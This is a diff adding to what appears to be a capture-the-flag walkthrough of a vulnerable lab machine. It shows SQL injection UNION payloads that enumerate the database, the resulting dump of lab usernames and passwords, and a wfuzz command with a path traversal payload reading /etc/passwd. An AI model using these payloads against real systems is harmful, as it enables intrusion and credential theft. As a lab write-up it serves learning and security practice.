@@ -75,3 +75,111 @@ Tom'-- -
 
 tring to detect columns number to run UNION query...
 found that they are 6 columns   ### Tom' ORDER BY 6-- -
+
+
+we will run set of queries to get informations 
+
+search=Tom' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
+Result: Staff
+
+search=Tom' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema="Staff"-- -
+Result = StaffDetails,Users
+
+search=Tom' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema="Staff"-- -
+Result= ID: id,firstname,lastname,position,phone,email,reg_date,UserID,Username,Password
+
+
+search=Tom' UNION SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -   
+### admin:856f5de590ef37314e7c3bdf6f8a66dc  
+     ### : transorbital1 
+
+
+'UNION SELECT group_concat(username,":",password),2,3,4,5,6 from users.UserDetails-- -
+Result=
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+
+
+after we login as admin 
+![2]({{site.baseurl}}/_posts/2.png)
+
+	File does not exist
+	it seems as hint to parameter called file 
+	so we will fuzz it  
+
+
+- └─# wfuzz  -b'PHPSESSID=7iu4vf3td19qtp16374hm8vcdv' --hw 100 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://192.168.162.136/manage.php?FUZZ=../../../../../../../../../../etc/passwd
+- 
+- 	
+- 	
+- 	
+- 	=====================================================================
+- ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
+- =====================================================================
+- 
+- 000000010:   200        93 L     172 W      3694 Ch     "file"                  
+- 	
+- 	
+- 	-
+
+
+
+
+	we found a paramater mane called file 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
